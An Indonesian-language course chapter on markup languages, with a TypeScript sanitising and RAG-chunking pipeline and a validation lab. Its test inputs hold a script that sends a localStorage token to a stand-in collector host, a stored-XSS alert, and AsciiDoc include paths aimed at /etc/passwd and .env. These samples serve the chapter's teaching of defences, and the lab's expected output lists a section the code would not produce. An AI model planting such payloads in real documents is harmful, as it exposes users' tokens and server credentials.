# Module 01: Foundations of Technical Documentation Architecture
## Bab 04: Markup Languages — CommonMark, GFM, MDX, & AsciiDoc

---

### 1. Learning Objectives

Setelah menyelesaikan bab ini, Anda diharapkan mampu:

*   **Menganalisis Perbedaan Leksikal & AST**: Membedakan spesifikasi parsing, transisi *state machine*, dan representasi *Abstract Syntax Tree* (AST) antara CommonMark, GitHub Flavored Markdown (GFM), MDX, dan AsciiDoc.
*   **Merancang Pipeline Kompilasi Dual-Target**: Mengembangkan arsitektur pemrosesan dokumen yang mampu menghasilkan output ganda secara deterministik: representasi visual interaktif (HTML/React DOM) dan representasi semantik (*token-bounded chunks*) untuk konsumsi *Retrieval-Augmented Generation* (RAG) serta *Autonomous Agents*.
*   **Mengimplementasikan AST Transformer Produksi**: Menulis mesin pemroses dokumen berbasis TypeScript menggunakan ekosistem `unified` (`remark`/`rehype`) yang mengekstrak metadata struktural, membersihkan vektor serangan injeksi (XSS/Prototype Pollution), dan menangani ambiguitas sintaksis.
*   **Mengevaluasi Vektor Kegagalan & Keamanan**: Mendiagnosis kerentanan *Regular Expression Denial of Service* (ReDoS), eksploitasi *path traversal* pada transklusi berkas, serta ketidakkonsistenan pohon sintaksis akibat parsing dokumen tak terstruktur.

---

### 2. Concept Overview

Dalam rekayasa sistem dokumentasi modern, khususnya pada ekosistem **AI, Data, and Autonomous Agents**, dokumen teks tidak lagi diposisikan sebagai artefak statis semata. Dokumen berfungsi ganda: sebagai antarmuka manusia (*human-readable interface*) dan sebagai sumber data terstruktur berakurasi tinggi (*machine-readable knowledge base*) yang diurai oleh parser, LLM, dan *autonomous agents*.

```
+-----------------------------------------------------------------------------------+
|                            THE MARKUP SPECTRUM                                    |
|                                                                                   |
|  [CommonMark] --------> [GFM] -------------> [MDX] -------------> [AsciiDoc]      |
|   Strict Spec           Engineering Ext.      Runtime Dynamic      Semantic Doc-    |
|   Ambiguity-Free        Tables, Tasklists     Markdown + JSX       as-Code Engine   |
|   Deterministic AST     Sanitized Render      Client Components    Includes/Macros  |
+-----------------------------------------------------------------------------------+
```

#### Mental Model: Konten sebagai State Machine vs. Konten sebagai Objek Semantik

1.  **CommonMark**: Lahir dari kebutuhan standardisasi terhadap fragmentasi implementasi Markdown asli buatan John Gruber (2004). CommonMark menetapkan formalitas tata bahasa (*grammar*) yang deterministik, mendefinisikan fase *block structure parsing* dan *inline parsing* menggunakan model *precedence automata* yang ketat. Parsing CommonMark menjamin bahwa dua parser yang patuh pada spesifikasi akan menghasilkan representasi pohon sintaksis yang identik dari input arbitrer mana pun.
2.  **GitHub Flavored Markdown (GFM)**: Merupakan superset formal dari CommonMark (berdasarkan RFC 0.29). GFM menambahkan elemen sintaksis level rekayasa perangkat lunak: tabel pipa, daftar tugas (*task lists*), *strikethrough*, *autolinks*, serta algoritma filter HTML mentah (*tag filtering*) untuk mengeliminasi vektor eksploitasi peramban dasar.
3.  **MDX (Markdown + JSX)**: Paradigma pergeseran dari dokumen statis murni menuju dokumen interaktif (*programmable document*). MDX menyatukan parsing Markdown AST (`mdast`) dengan parsing JavaScript/JSX AST (`estree`). Di balik layar, parser MDX harus mendeteksi batas konteks leksikal secara dinamis: kapan sebuah kurung kurawal `{}` merepresentasikan blok kode arbitrer, kapan merepresentasikan interpolasi JavaScript runtime, dan kapan tag `<Component />` harus dipisahkan dari tag HTML konvensional.
4.  **AsciiDoc**: Bahasa markah semantik yang dirancang sejak awal untuk kebutuhan dokumentasi teknis skala *enterprise* (buku teknis, spesifikasi arsitektur kompleks, manual kepatuhan). Berbeda dengan Markdown yang berakar pada representasi HTML cepat, AsciiDoc memiliki model objek dokumen (*Document Object Model*) tingkat enterprise secara natif: dukungan transklusi (*multi-file inclusion*), substitusi atribut variabel, *conditional compilation* (`ifdef::[]`), penomoran bab otomatis, serta tata letak tabel yang kompleks.

---

### 3. Why It Matters

Kegagalan memahami nuansa sintaktis dan arsitektur internal dari format markah ini berdampak langsung pada keandalan sistem produksi:

1.  **Degradasi Ekstraksi Konteks RAG**: Agen otonom bergantung pada *chunking* berbasis semantik. Markdown parser yang non-deterministik akan memecah tabel GFM di tengah baris, merusak referensi tautan, atau gagal mengidentifikasi hierarki heading `#` hingga `######`. Akibatnya, *embedding vectors* terkontaminasi dengan potongan teks yang kehilangan relasi sintaksisnya (*semantic drift*).
2.  **Kompatibilitas Kompilasi Docs-as-Code Terdistribusi**: Dokumentasi untuk sistem AI skala enterprise (misal: *framework* orkestrasi model, infrastruktur MLOps) sering kali tersebar di puluhan repositori Git. Kebutuhan *transclusion* (menyematkan skema JSON, konfigurasi YAML, atau *docstring* kode sumber aktual ke dalam halaman dokumentasi) tidak dapat ditangani secara aman oleh CommonMark standar tanpa mengorbankan portabilitas. AsciiDoc menjadi penyelamat dalam arsitektur multi-repositori (misalnya melalui Antora).
3.  **Interaktivitas Antarmuka Agen**: MDX memungkinkan teknikal arsitek menyematkan komponen telemetry visual langsung di dalam dokumentasi operasional (*runbooks*). Tim dapat menguji coba pemanggilan API agen (*interactive prompt playground*) langsung di tengah halaman dokumentasi arsitektur sistem.
4.  **Permukaan Serangan Keamanan (Security Surface)**: Mengizinkan input dokumen yang tidak disanitasi dari pengguna atau agen LLM membuka celah *Stored Cross-Site Scripting* (XSS) melalui tag HTML mentah yang tidak difilter, atau *Denial of Service* (ReDoS) pada engine parser regex yang rapuh.

---

### 4. Arsitektur & Diagram Komponen

Diagram berikut mengilustrasikan jalur kompilasi konten: dari representasi string mentah melalui tahapan tokenisasi, ekstraksi AST, transformasi node, hingga percabangan target (HTML render interaktif vs. *Semantic Chunks* untuk database vektor agen).

```
+----------------------------------------------------------------------------------------------------+
|                                 UNIFIED COMPILATION PIPELINE ARCHITECTURE                         |
+----------------------------------------------------------------------------------------------------+
                                                  |
                                                  v
                                      +-----------------------+
                                      | Raw Source Document   |
                                      | (GFM / MDX / AsciiDoc)|
                                      +-----------------------+
                                                  |
                                                  | (Lexical Phase)
                                                  v
                                      +-----------------------+
                                      | Lexer / Tokenizer     |
                                      | Micromark / Asciidoctor|
                                      +-----------------------+
                                                  |
                                                  | (Syntax Parsing)
                                                  v
                  +---------------------------------------------------------------+
                  |                   ABSTRACT SYNTAX TREE (AST)                  |
                  |  - CommonMark/GFM: mdast (Markdown Abstract Syntax Tree)     |
                  |  - MDX: mdast + estree (Embedded JavaScript Syntax Tree)      |
                  |  - AsciiDoc: Asciidoctor AST Document Graph                  |
                  +---------------------------------------------------------------+
                                                  |
                     +----------------------------+----------------------------+
                     |                                                         |
                     v (AST Mutation & Security Traversal)                     v (Semantic Extraction Traversal)
      +-----------------------------+                           +-----------------------------+
      | Security & Normalization    |                           | Context Window Optimizer    |
      | - Hast Sanitization         |                           | - Token Size Calculation    |
      | - Disallow Unsafe Raw HTML  |                           | - Semantic Heading Hoisting |
      | - Normalize GFM Tables      |                           | - Codeblock Isolation       |
      | - Validate MDX Components   |                           | - Transclusion Resolution   |
      +-----------------------------+                           +-----------------------------+
                     |                                                         |
                     v                                                         v
      +-----------------------------+                           +-----------------------------+
      | Hypertext AST (hast)        |                           | Structured Semantic Chunks  |
      +-----------------------------+                           +-----------------------------+
                     |                                                         |
                     +----------------------------+                            |
                     |                            |                            |
                     v                            v                            v
      +-----------------------------+ +-----------------------+ +-----------------------------+
      | Production Static HTML      | | Dynamic React / MDX   | | Vector Embeddings Pipeline  |
      | (Developer Portal UI)       | | Runtime Component     | | (RAG Knowledge Ingestion)   |
      +-----------------------------+ +-----------------------+ +-----------------------------+
```

---

### 5. Deep Dive Mekanisme & Prinsip Kerja

#### A. CommonMark Parsing Model: The Two-Phase Engine

Spesifikasi CommonMark memecah parsing ke dalam dua tahapan diskrit untuk menyelesaikan masalah rekursi tak terbatas dan ambiguitas tata bahasa:

1.  **Fase 1: Struktur Blok (Block Structure)**
    Input dianalisis baris per baris. Parser mempertahankan *container stack* yang merepresentasikan hierarki blok yang sedang aktif (misalnya: *BlockQuote* berisi *List*, yang berisi *ListItem*, yang berisi *Paragraph*).
    Parser memeriksa apakah baris saat ini melanjutkan blok terbuka atau memulai blok baru (misalnya dengan mengecek *indentation*, *fence characters* seperti ```` ``` ```` atau `~~~`, *block quote markers* `>`).
    Karakter di dalam blok belum diurai maknanya; teks disimpan sebagai *leaf blocks* (blok daun) mentah.

2.  **Fase 2: Struktur Sebaris (Inline Parsing)**
    Setelah pohon blok selesai dibangun, parser melacak teks sebaris pada setiap blok daun untuk membentuk token *emphasis*, *code spans*, *links*, dan *images*.
    Fase ini menggunakan **Delimiter Stacks**. Ketika karakter seperti `*` atau `_` ditemukan, node penanda didorong ke dalam stack beserta status leksikalnya (*can_open*, *can_close* berdasarkan whitespace di sekitarnya). Ketika pasangan penutup ditemukan, parser berjalan mundur ke dalam stack untuk mencocokkan penanda dan mengonstruksi node AST penekanan secara deterministik.

#### B. GFM: Penanganan State Ambigu pada Tabel

Tabel GFM bukanlah elemen bawaan CommonMark. Format ini mengandalkan parsing berbasis *delimiter line* yang rentan gagal:

```markdown
| Header 1 | Header 2 |
| :------- | :------- |
| Cell `|` | Cell 2   |
```

Parser GFM harus memiliki *lookahead engine* untuk membedakan pipa (`|`) sebagai pemisah kolom dengan pipa yang berada di dalam *inline code span* (`` `|` ``). Jika karakter `|` di-escape (`\|`), *inline lexer* harus menunda evaluasi hingga batas sel diisolasi secara presisi.

#### C. MDX: Dual AST Unification (`mdast` + `estree`)

MDX tidak hanya memproses Markdown; ia menyematkan runtime JS. Mesin parsing MDX mengintegrasikan parser Markdown (seperti `micromark`) dengan parser JavaScript (seperti `acorn`).
*   Saat mendeteksi karakter `{`, tokenizer Markdown beralih status (*state shift*) ke parser JavaScript `acorn` untuk mengurai ekspresi ECMAScript.
*   Jika ekspresi valid, sub-pohon `estree` dilekatkan langsung ke dalam node `mdxFlowExpression` atau `mdxTextExpression` pada `mdast`.
*   Tantangan arsitektur: Karakter `<` dapat menandakan pembukaan elemen HTML biasa, elemen JSX kustom (`<TelemetryGraph agentId="42" />`), atau sekadar operator relasional matematis (`a < b`). Parser MDX mengeksekusi *backtracking* berat untuk memverifikasi apakah sintaksis tersebut merupakan JSX yang valid atau teks mentah.

#### D. AsciiDoc: Attribute Substitution & Inclusion Engine

Arsitektur parser AsciiDoc (misalnya `asciidoctor`) didasarkan pada model *preprocessor pass-through*. Sebelum pohon sintaksis dibentuk:
1.  **Substitusi Atribut**: Token seperti `{sys-agent-version}` dicari di dalam tabel atribut global dan lokal, lalu diinterpolasi.
2.  **Eksekusi Transklusi File**: Direktif `include::path/to/component.py[lines=12..40]` memicu pemanggilan I/O berkas langsung di level parsing, menyuntikkan konten parsial ke dalam aliran baris sebelum *block tokenizer* dieksekusi.
3.  **Kondisional**: Direktif `ifdef::env-production[]` secara dinamis membuang atau menyertakan percabangan dokumen sebelum parsing semantik terjadi.

---

### 6. Production-Ready Code Implementation

Berikut adalah implementasi pipeline pemrosesan dokumen berbasis TypeScript tingkat produksi. Pipeline ini menggunakan ekosistem `unified` untuk:
1.  Mendukung parsing CommonMark, GFM, dan MDX.
2.  Mengekstrak metadata semantik struktural untuk konsumsi LLM/RAG (melakukan sanitasi terhadap node non-tekstual).
3.  Menerapkan sanitasi ketat untuk keamanan peramban (mengeliminasi potensi XSS dari HTML mentah).
4.  Menghasilkan *semantic chunks* berukuran terukur (*token-friendly*) yang mengisolasi blok kode dan hierarki heading.

```json
{
  "name": "enterprise-doc-pipeline",
  "version": "1.0.0",
  "type": "module",
  "dependencies": {
    "@types/node": "^20.11.0",
    "acorn": "^8.11.3",
    "mdast-util-to-string": "^4.0.0",
    "rehype-sanitize": "^6.0.0",
    "rehype-stringify": "^10.0.0",
    "remark-gfm": "^4.0.0",
    "remark-mdx": "^3.0.0",
    "remark-parse": "^11.0.0",
    "remark-rehype": "^11.1.0",
    "unified": "^11.0.4",
    "unist-util-visit": "^5.0.0"
  },
  "devDependencies": {
    "typescript": "^5.3.3"
  }
}
```

```typescript
// src/processor.ts
import { unified, type Plugin } from 'unified';
import remarkParse from 'remark-parse';
import remarkGfm from 'remark-gfm';
import remarkMdx from 'remark-mdx';
import remarkRehype from 'remark-rehype';
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
import rehypeStringify from 'rehype-stringify';
import { visit } from 'unist-util-visit';
import { toString } from 'mdast-util-to-string';
import type { Node, Parent } from 'unist';
import type { Root as MdastRoot, Heading, Code } from 'mdast';

// ============================================================================
// Types and Interfaces
// ============================================================================

export interface SemanticChunk {
  id: string;
  headingPath: string[];
  content: string;
  hasCode: boolean;
  codeLanguages: string[];
  estimatedTokens: number;
}

export interface ProcessingResult {
  sanitizedHtml: string;
  semanticChunks: SemanticChunk[];
  metadata: {
    title: string;
    totalHeadings: number;
    detectedCodeBlocks: number;
  };
}

export interface PipelineOptions {
  enableMdx: boolean;
  maxTokensPerChunk?: number;
}

// ============================================================================
// Custom Plugins for AST Transformation & Agent Optimization
// ============================================================================

/**
 * Plugin Unified untuk mengekstraksi representasi semantik hierarkis
 * yang dioptimalkan untuk RAG ingestion.
 */
const remarkSemanticChunker: Plugin<[{ chunks: SemanticChunk[] }], MdastRoot> = (options) => {
  return (tree: MdastRoot) => {
    const currentHeadingStack: string[] = [];
    let currentChunkBuffer: string[] = [];
    let currentCodeLangs: string[] = [];
    let chunkCounter = 0;

    const flushChunk = () => {
      if (currentChunkBuffer.length === 0) return;

      const rawContent = currentChunkBuffer.join('\n\n').trim();
      if (!rawContent) return;

      // Estimasi token primitif (standar heuristik ~4 karakter/token untuk teks teknis)
      const estimatedTokens = Math.ceil(rawContent.length / 4);

      options.chunks.push({
        id: `chunk-${++chunkCounter}`,
        headingPath: [...currentHeadingStack],
        content: rawContent,
        hasCode: currentCodeLangs.length > 0,
        codeLanguages: [...new Set(currentCodeLangs)],
        estimatedTokens,
      });

      currentChunkBuffer = [];
      currentCodeLangs = [];
    };

    // Traversal pohon Markdown AST
    for (const node of tree.children) {
      if (node.type === 'heading') {
        const headingNode = node as Heading;
        const depth = headingNode.depth;
        const headingText = toString(headingNode);

        // Potong buffer sebelumnya ketika menemui batas heading baru
        flushChunk();

        // Sesuaikan stack hierarki sesuai heading level
        while (currentHeadingStack.length >= depth) {
          currentHeadingStack.pop();
        }
        currentHeadingStack.push(headingText);
      } else if (node.type === 'code') {
        const codeNode = node as Code;
        if (codeNode.lang) {
          currentCodeLangs.push(codeNode.lang);
        }
        currentChunkBuffer.push(`\`\`\`${codeNode.lang || ''}\n${codeNode.value}\n\`\`\``);
      } else {
        const textRepresentation = toString(node);
        if (textRepresentation.trim().length > 0) {
          currentChunkBuffer.push(textRepresentation);
        }
      }
    }

    // Flush sisa konten terakhir
    flushChunk();
  };
};

/**
 * Normalizer AST untuk MDX: Menghilangkan raw JavaScript runtime dari 
 * representasi text extraction agar tidak merusak semantic embedding space LLM.
 */
const remarkStripMdxRuntimeNodes: Plugin<[], MdastRoot> = () => {
  return (tree: MdastRoot) => {
    visit(tree, (node: Node, index: number | undefined, parent: Parent | undefined) => {
      if (
        node.type === 'mdxjsEsm' ||
        node.type === 'mdxFlowExpression' ||
        node.type === 'mdxTextExpression'
      ) {
        if (parent && typeof index === 'number') {
          // Hapus node runtime ekspresi JavaScript murni dari AST
          parent.children.splice(index, 1);
          return index;
        }
      }
    });
  };
};

// ============================================================================
// Core Documentation Compiler Engine
// ============================================================================

export class EnterpriseDocCompiler {
  private baseSchema: typeof defaultSchema;

  constructor() {
    // Definisi sanitasi schema: Blokir script injection, amankan iframe/embed
    this.baseSchema = {
      ...defaultSchema,
      tagNames: [
        ...(defaultSchema.tagNames || []),
        'table', 'thead', 'tbody', 'tr', 'th', 'td',
        'details', 'summary', 'span'
      ],
      attributes: {
        ...defaultSchema.attributes,
        code: ['className'],
        th: ['align'],
        td: ['align'],
        div: ['className'],
      },
    };
  }

  public async compile(
    rawDocument: string,
    options: PipelineOptions
  ): Promise<ProcessingResult> {
    if (typeof rawDocument !== 'string') {
      throw new TypeError('Pipeline Error: Input document must be a valid string.');
    }

    const collectedChunks: SemanticChunk[] = [];
    const processor = unified().use(remarkParse);

    // Dynamic Injection: Dukungan GFM wajib aktif untuk ekosistem AI/Data
    processor.use(remarkGfm);

    if (options.enableMdx) {
      processor.use(remarkMdx);
      processor.use(remarkStripMdxRuntimeNodes);
    }

    // Ekstraksi semantik ke chunks sebelum konversi ke HTML AST
    processor.use(remarkSemanticChunker, { chunks: collectedChunks });

    // Pipeline Transformasi AST: Markdown (mdast) -> HTML (hast) -> String Sanitasi
    processor
      .use(remarkRehype, { allowDangerousHtml: false }) // Tolak raw HTML unsafe di awal
      .use(rehypeSanitize, this.baseSchema)
      .use(rehypeStringify);

    try {
      const vfileResult = await processor.process(rawDocument);
      const outputHtml = String(vfileResult);

      // Metadata extraction summary
      let totalHeadings = 0;
      let detectedCodeBlocks = 0;
      for (const chunk of collectedChunks) {
        if (chunk.headingPath.length > 0) totalHeadings++;
        if (chunk.hasCode) detectedCodeBlocks++;
      }

      const title = collectedChunks[0]?.headingPath[0] || 'Untitled Specification';

      return {
        sanitizedHtml: outputHtml,
        semanticChunks: collectedChunks,
        metadata: {
          title,
          totalHeadings,
          detectedCodeBlocks,
        },
      };
    } catch (error) {
      const err = error as Error;
      throw new Error(`Critical Compilation Failure: ${err.message}`);
    }
  }
}

// ============================================================================
// Execution / Usage Demonstration
// ============================================================================

async function runDemo() {
  const compiler = new EnterpriseDocCompiler();

  const sampleAgentSpecification = `
# Autonomous Multi-Agent Protocol (AMAP)

AMAP mengarahkan komunikasi inter-node pada kluster inferensi data.

## Konfigurasi Runtime

Berikut adalah dependensi spesifikasi lingkungan untuk node:

| Node Type | Min Memory | Network Throughput |
| :-------- | :--------- | :----------------- |
| Master    | 32GB       | 10 Gbps            |
| Worker    | 128GB      | 40 Gbps            |

## Algoritma Sinkronisasi

\`\`\`python
def route_payload(payload: dict, agent_id: str) -> bool:
    # Mengarahkan pesan ke buffer agen otonom
    if not payload.get("signature"):
        raise ValueError("Invalid payload signature")
    return True
\`\`\`

<script>alert("Exploit Attempt: Stored XSS");</script>

Terakhir, pastikan pemantauan metrik selalu aktif.
`;

  console.log('[+] Starting Compilation Process...');
  try {
    const result = await compiler.compile(sampleAgentSpecification, { enableMdx: false });
    console.log('\n=== METADATA ===');
    console.dir(result.metadata, { depth: null });

    console.log('\n=== EXTRACTED SEMANTIC CHUNKS (FOR RAG) ===');
    console.dir(result.semanticChunks, { depth: null });

    console.log('\n=== SANITIZED PRODUCTION HTML (OUTPUT) ===');
    console.log(result.sanitizedHtml);
  } catch (err) {
    console.error('[-] Error executing demo:', err);
  }
}

runDemo();
```

---

### 7. Edge Cases & Failure Modes

#### 1. Delimiter Confusion pada Tabel GFM Berisi Simbol Pipa
*   **Kasus**: Sebuah sel tabel mendokumentasikan ekspresi logika atau tipe serikat TypeScript, misalnya: `string | number`.
*   **Vektor Kegagalan**: Penulisan tanpa pembungkusan inline code span atau backslash yang presisi (`| string | number |`) akan merusak parsing baris tabel, menggeser seluruh kolom ke kanan, serta menghasilkan AST yang malformasi.
*   **Mitigasi**: Implementasi pra-validasi Linter (misal: `markdownlint`) pada pipeline CI/CD yang memaksa penulisan escape `\|` atau pembungkusan code-ticks `` `string | number` `` sebelum dokumen dikompilasi.

#### 2. MDX Unbalanced JSX Tags Merusak Seluruh Pohon AST
*   **Kasus**: Penulis teknis menulis perbandingan logika matematis: `Performa sistem menurun jika latency > 500ms dan memory < 20%`.
*   **Vektor Kegagalan**: Parser MDX mengidentifikasi `< 20%` sebagai token pembuka elemen JSX yang tidak valid. Parser gagal melakukan resolving, melempar exception leksikal fatal, dan mematikan seluruh proses build dokumentasi portal.
*   **Mitigasi**: Gunakan entitas HTML standar (`&lt;` dan `&gt;`) atau bungkus representasi dalam inline codeticks: `` latency > 500ms ``. Pipeline build harus menangkap *error parsing MDX* secara granular per halaman agar tidak merusak build situs secara global.

#### 3. Path Traversal melalui AsciiDoc `include::[]` Directives
*   **Kasus**: Agen LLM yang memiliki kapabilitas memodifikasi atau menulis dokumen teknis menyuntikkan arahan sistem: `include::/etc/passwd[]` atau `include::../../.env[]`.
*   **Vektor Kegagalan**: Parser Asciidoctor standar membaca path absolut/relatif secara langsung dari disk host, mengekspos kredensial infrastruktur ke dalam artefak HTML hasil build.
*   **Mitigasi**: Menjalankan engine kompilasi AsciiDoc dalam mode restriksi ketat (*Safe Mode* level `SECURE`):
    ```ruby
    Asciidoctor.convert_file 'spec.adoc', safe: :secure
    ```
    Mode ini menonaktifkan direktif `include` lintas direktori kerja root dan mencegah eksekusi atribut berbahaya.

#### 4. Regular Expression Denial of Service (ReDoS) pada Delimiter Penutup
*   **Kasus**: Dokumen memuat 50.000 karakter spasi atau tanda bintang penekanan yang tidak pernah ditutup: `*text... [ribuan whitespace]`.
*   **Vektor Kegagalan**: Algoritma pencarian penutup penanda (*delimiter pairing*) pada parser Markdown non-standar yang menggunakan *backtracking regular expressions* kompleks akan mengalami lonjakan konsumsi CPU eksponensial ($O(2^n)$), menyebabkan thread pipeline hang.
*   **Mitigasi**: Gunakan hanya parser berbasis spesifikasi CommonMark 0.29+ yang menggunakan automata linier bertahap (*delimited list scanning* berbiaya waktu $O(n)$) seperti `micromark` atau implementasi C murni seperti `cmark`.

---

### 8. Trade-offs & Alternatif Solusi

| Dimensi Evaluasi | CommonMark | GitHub Flavored Markdown (GFM) | MDX (v2/v3) | AsciiDoc (Asciidoctor) |
| :--- | :--- | :--- | :--- | :--- |
| **Parsing Determinism** | **Sangat Tinggi**. Memiliki formal grammar terlengkap di kelasnya. | **Tinggi**. Superset formal CommonMark. Determinisme terjaga. | **Rendah - Sedang**. Rentan ambiguitas antara teks bebas & JSX tag. | **Tinggi**. Ditentukan oleh satu arsitektur rujukan canonical. |
| **Kemampuan Transklusi Multi-File** | **Nol**. Tidak ada konsep transklusi natif. Harus pakai tooling eksternal. | **Nol**. Terbatas pada linking halaman terpisah. | **Tinggi**. Dilakukan via JavaScript standard `import` syntax. | **Maksimal**. Didukung secara arsitektural (`include::[]`). |
| **Interaktivitas Runtime** | **Tidak Ada**. Statis murni. | **Tidak Ada**. Statis murni. | **Sangat Tinggi**. Dapat mengeksekusi React, Vue, Svelte components. | **Terbatas**. Hanya melalui blok passthrough macro HTML/JS. |
| **Kesesuaian untuk RAG Chunker** | **Tinggi**. Struktur heading dan paragraf mudah dipecah linier. | **Sangat Tinggi**. Adanya tabel & tasklist mempermudah ekstraksi data. | **Kompleks**. Harus membuang AST ekspresi runtime JS sebelum embedding. | **Tinggi**. Semantic roles & section tagging mempermudah indexing. |
| **Overhead Kompilasi (Speed)** | **Ultra Cepat** (Dapat dieksekusi via binary C/Rust native). | **Sangat Cepat**. Sedikit overhead untuk pemrosesan tabel/autolink. | **Lambat**. Memerlukan translasi compiler JavaScript (Babel/Acorn). | **Moderat**. Pemrosesan preprosesor, makro, dan traversal atribut. |
| **Blast Radius Keamanan** | **Sangat Rendah**. Parsing deterministik mengabaikan script eksternal. | **Rendah**. Filter tag HTML bawaan mencegah payload umum. | **Tinggi**. Potensi eksekusi script arbitrary dalam komponen MDX. | **Moderat**. Rentan path traversal jika Safe Mode tidak diaktifkan. |

---

### 9. Best Practices & Standar Industri

1.  **Strict Linting dengan Parsing AST**: Terapkan linting dokumen pada tahap pre-commit dan CI menggunakan parser berbasis AST (misalnya: `markdownlint-cli2` untuk Markdown/GFM, `vale` untuk konsistensi terminologi gaya penulisan). Hindari validasi markah menggunakan regex custom.
2.  **Enforce Safe Mode pada AsciiDoc Pipelines**: Jika pipeline arsitektur Anda memproses dokumentasi skala besar menggunakan Antora atau Asciidoctor, tetapkan selalu konfigurasi `safe: :safe` atau `safe: :secure`. Larang akses dokumen terhadap parent traversal directory (`../`).
3.  **Sanitisasi HTML Berlapis (*Defense-in-Depth*)**: Jangan pernah mengandalkan satu filter sanitasi. Jika alur kerja membutuhkan HTML mentah di dalam Markdown, jalankan pipeline pembersih (misalnya: `rehype-sanitize`) menggunakan pendekatan *Allowlist Sanitization Schema* ketat: hanya izinkan tag semantik aman (`<code>`, `<pre>`, `<table>`, `<kbd>`). Blokir secara absolut tag berisiko tinggi (`<script>`, `<iframe>`, `<object>`, `<embed>`).
4.  **Isolasi Konteks untuk Model AI**: Saat merancang dokumentasi sebagai antarmuka ingestion untuk *autonomous agents*, dokumentasikan skema konfigurasi menggunakan format tabel GFM atau blok kode dengan identifier bahasa yang valid (misalnya: ```` ```json ```` atau ```` ```yaml ````). Identifikasi ini dibaca langsung oleh tokenizers AI untuk menentukan mode parsing token.

---

### 10. Hands-on Lab Exercise

#### Skenario Lab
Anda adalah seorang Principal Documentation Engineer pada sebuah startup AI Autonomous Agent. Anda diminta membangun sebuah modul validasi dokumen otomatis yang bertugas menginspeksi input dokumentasi agent tools dari repositori terbuka, menghapus potensi serangan injeksi teks/HTML, serta memverifikasi bahwa spesifikasi tersebut dapat dipecah menjadi *semantic chunks* berukuran tidak lebih dari batas token konteks LLM.

#### Langkah 1: Setup Lingkungan Kerja
Pastikan Node.js LTS (v20+) telah terpasang pada workstation Anda. Buat direktori pengujian dan inisialisasi modul:

```bash
mkdir doc-architect-lab && cd doc-architect-lab
npm init -y
npm pkg set type="module"
npm install typescript @types/node --save-dev
npx tsc --init
```

Perbarui konfigurasi `tsconfig.json` untuk mendukung *ESNext module resolution*:
```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "outDir": "./dist"
  },
  "include": ["src/**/*"]
}
```

Pasang dependensi kompilasi sintaksis:
```bash
npm install unified remark-parse remark-gfm remark-rehype rehype-sanitize rehype-stringify mdast-util-to-string unist-util-visit
```

#### Langkah 2: Implementasi Script Verifikasi
Buat file `src/lab_validator.ts`:

```typescript
import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkGfm from 'remark-gfm';
import { toString } from 'mdast-util-to-string';
import type { Root, Heading, Table } from 'mdast';

const testCorpus = `
# Data Ingestion Agent Specs

Spesifikasi sistem automasi ingestion cluster.

## Tabel Parameter Endpoint

| Parameter | Type | Required | Description |
| :--- | :--- | :--- | :--- |
| batch_size | integer | Yes | Volume per commit |
| retry_limit | integer | No | Default: 3 |

## Security Warnings

<script>
  window.location.href = 'https://malicious-collector.internal/leak?token=' + localStorage.getItem('token');
</script>

Pastikan endpoint terlindungi oleh mutual TLS.
`;

async function validateAndInspect(rawDoc: string) {
  let tableDetected = false;
  let rawHtmlDetected = false;
  const sections: { title: string; tokenEstimate: number }[] = [];

  const processor = unified()
    .use(remarkParse)
    .use(remarkGfm)
    .use(() => (tree: Root) => {
      let currentSectionTitle = 'Intro';
      let currentSectionText = '';

      for (const node of tree.children) {
        if (node.type === 'heading') {
          if (currentSectionText.trim()) {
            sections.push({
              title: currentSectionTitle,
              tokenEstimate: Math.ceil(currentSectionText.length / 4),
            });
          }
          currentSectionTitle = toString(node);
          currentSectionText = '';
        } else if (node.type === 'table') {
          tableDetected = true;
          currentSectionText += ' ' + toString(node);
        } else if (node.type === 'html') {
          rawHtmlDetected = true;
          // Security Alert Triggered
        } else {
          currentSectionText += ' ' + toString(node);
        }
      }

      if (currentSectionText.trim()) {
        sections.push({
          title: currentSectionTitle,
          tokenEstimate: Math.ceil(currentSectionText.length / 4),
        });
      }
    });

  await processor.process(rawDoc);

  console.log('--- REKAPITULASI VALIDASI ARSITEKTUR ---');
  console.log(`[!] Deteksi Tabel GFM            : ${tableDetected ? 'VALID' : 'FAILED'}`);
  console.log(`[!] Deteksi Payload HTML Rentan   : ${rawHtmlDetected ? 'WARNING DETECTED' : 'CLEAN'}`);
  console.log('\n--- STRUKTUR CHUNKING KONTEKS ---');
  sections.forEach((sec, idx) => {
    console.log(`Section [${idx + 1}] "${sec.title}" -> Estimasi: ${sec.tokenEstimate} tokens`);
  });
}

validateAndInspect(testCorpus);
```

#### Langkah 3: Eksekusi dan Verifikasi Hasil
Jalankan kompilasi dan eksekusi skrip:

```bash
npx tsc
node dist/lab_validator.js
```

**Kriteria Keberhasilan Eksekusi:**
1.  Terminal menampilkan `[!] Deteksi Tabel GFM : VALID`.
2.  Terminal menampilkan status peringatan `[!] Deteksi Payload HTML Rentan : WARNING DETECTED` (karena adanya tag `<script>`).
3.  Modul berhasil mengestimasi dan mencetak ukuran token secara terisolasi untuk tiap seksi (`Intro`, `Data Ingestion Agent Specs`, `Tabel Parameter Endpoint`, dan `Security Warnings`) tanpa memicu unhandled rejection error.